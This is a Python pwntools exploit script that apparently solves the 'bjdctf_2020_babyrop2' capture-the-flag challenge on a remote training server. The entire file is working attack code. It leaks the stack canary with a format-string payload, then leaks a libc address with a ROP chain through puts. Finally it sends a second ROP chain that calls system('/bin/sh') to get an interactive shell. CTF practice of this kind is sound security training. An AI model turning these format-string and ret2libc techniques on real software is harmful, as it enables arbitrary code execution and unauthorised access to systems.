#coding:utf-8
from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
sh = process("./bjdctf_2020_babyrop2")
sh = remote("node3.buuoj.cn",26601)
elf = ELF("./bjdctf_2020_babyrop2")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x400993
main = 0x4008DA
payload = "%7$p"
sh.recvuntil("I'll give u some gift to help u!\n")
sh.sendline(payload)
# gdb.attach(sh)
# pause()
sh.recvuntil("0x")
canary = int(sh.recv(16),16)
log.info("success leak canary:0x%x"%canary)
payload =  p64(canary)
payload = payload.rjust(0x20,'a')
payload += p64(0) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(0x400887)
sh.sendline(payload)
sh.recvuntil("story!\n")
puts_addr = u64(sh.recv(6).ljust(8,"\x00"))
log.info("success leak read_got_addr:0x%x"%puts_addr)
libc = LibcSearcher('puts',puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
bin_sh = libc_base + libc.dump('str_bin_sh')
payload = p64(canary) 
payload = payload.rjust(0x20,'a')
payload += p64(0) + p64(pop_rdi) + p64(bin_sh) + p64(system_addr)
sh.sendline(payload)
sh.interactive()